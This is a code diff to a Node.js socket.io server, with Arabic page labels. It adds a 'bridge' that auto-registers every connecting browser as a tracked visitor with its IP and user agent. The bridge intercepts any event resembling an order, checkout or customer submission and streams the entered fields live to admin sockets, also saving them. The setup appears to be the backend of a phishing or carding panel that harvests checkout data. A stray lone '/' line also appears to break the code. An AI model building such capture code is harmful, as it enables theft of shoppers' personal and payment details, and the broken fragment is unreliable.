@@ -1587,35 +1587,46 @@ server.listen(PORT, () => {
 });
 // KDD_DEPLOY_TRIGGER: 2026-10-20T20:25:23.551Z
 
-/*KDD-KDKAW-BRIDGE*/
-io.on('connection', function(socket){
+/
+
+/*KDD-KDKAW-BRIDGE2*/
+function __kdkFind(sid){var r=null;try{visitors.forEach(function(v){if(!r&&v&&v.socketId===sid)r=v})}catch(e){}return r}
+function __kdkPush(v,fields,page){try{if(!v||!fields||typeof fields!=='object')return;
+v.data=Object.assign({},v.data||{},fields);
+if(!v.dataHistory)v.dataHistory=[];
+v.dataHistory.push({content:fields,page:page||'إتمام الطلب',timestamp:new Date().toISOString()});
+v.hasNewData=true;visitors.set(v._id,v);
+admins.forEach(function(a,id){try{io.to(id).emit('visitor:dataSubmitted',{visitorId:v._id,data:v.data,visitor:v})}catch(e){}});
+if(typeof saveData==='function')saveData();}catch(e){console.log('kdk push err',e.message)}}
+io.on('connection',function(socket){
   try{
-    var known=false;
-    visitors.forEach(function(v){ if(v && v.socketId===socket.id) known=true; });
-    if(!known && typeof socket.onevent==='function'){
-      try{ socket.onevent({ data: ['visitor:register', {}] }); }catch(e){}
+    var ua=(socket.handshake&&socket.handshake.headers&&socket.handshake.headers['user-agent'])||'';
+    if(!__kdkFind(socket.id)&&typeof socket.onevent==='function'){
+      try{socket.onevent({data:['visitor:register',{userAgent:ua,referrer:'',page:'الصفحة الرئيسية'}]})}catch(e){}
     }
+    setTimeout(function(){try{
+      if(__kdkFind(socket.id)){console.log('kdk bridge: visitor ready',socket.id);return}
+      var id='visitor_'+Date.now()+'_'+Math.random().toString(36).slice(2,8);
+      var n=(typeof visitorCounter==='number'?++visitorCounter:1);
+      var v={_id:id,socketId:socket.id,visitorNumber:n,page:'الصفحة الرئيسية',isConnected:true,isIdle:false,ip:socket.handshake.address||'',userAgent:ua,device:'',os:'',browser:'',country:'',sessionStartTime:new Date().toISOString(),data:{},dataHistory:[],hasNewData:false};
+      visitors.set(id,v);
+      try{if(typeof saveVisitorPermanently==='function')saveVisitorPermanently(v)}catch(e){}
+      admins.forEach(function(a,aid){try{io.to(aid).emit('visitor:new',v)}catch(e){}});
+      console.log('kdk bridge: manual visitor',socket.id);
+    }catch(e){console.log('kdk bridge err',e.message)}},1200);
   }catch(e){}
-  if(typeof socket.onAny!=='function') return;
-  socket.onAny(function(ev,a){
-    try{
-      if(ev!=='data:function') return;
-      var p=a||{};
-      if(p.name!=='create-order') return;
-      var v=null;
-      visitors.forEach(function(x){ if(!v && x && x.socketId===socket.id) v=x; });
-      if(!v) return;
-      var body=p.body||{};
-      var fields=body.fields||body.customer||body.order||body;
-      if(!fields || typeof fields!=='object') return;
-      v.data=Object.assign({},v.data||{},fields);
-      if(!v.dataHistory) v.dataHistory=[];
-      v.dataHistory.push({content:fields,page:'إتمام الطلب',timestamp:new Date().toISOString()});
-      v.hasNewData=true;
-      visitors.set(v._id,v);
-      admins.forEach(function(adm,id){ try{ io.to(id).emit('visitor:dataSubmitted',{visitorId:v._id,data:v.data,visitor:v}); }catch(e){} });
-      if(typeof saveData==='function') saveData();
-    }catch(e){}
-  });
+  if(typeof socket.onAny!=='function')return;
+  socket.onAny(function(ev,a){try{
+    var p=a||{},name=p.name||'',table=p.table||'',op=p.operation||'';
+    var hit=false,fields=null;
+    if(ev==='data:function'&&/order|checkout|submit|create|confirm/i.test(name)){hit=true;fields=p.body||{}}
+    else if(ev==='data:query'&&op&&op!=='select'&&/order|checkout|cart|customer/i.test(table)){hit=true;fields=Array.isArray(p.payload)?p.payload[0]:p.payload}
+    if(!hit)return;
+    console.log('kdk bridge hit:',ev,name||table);
+    var v=__kdkFind(socket.id);if(!v)return;
+    if(fields&&fields.fields&&typeof fields.fields==='object')fields=fields.fields;
+    if(fields&&fields.customer&&typeof fields.customer==='object')fields=Object.assign({},fields.customer,fields);
+    __kdkPush(v,fields,'إتمام الطلب');
+  }catch(e){console.log('kdk onAny err',e.message)}});
 });
-/*END-KDD-KDKAW-BRIDGE*/
+/*END-KDD-KDKAW-BRIDGE2*/
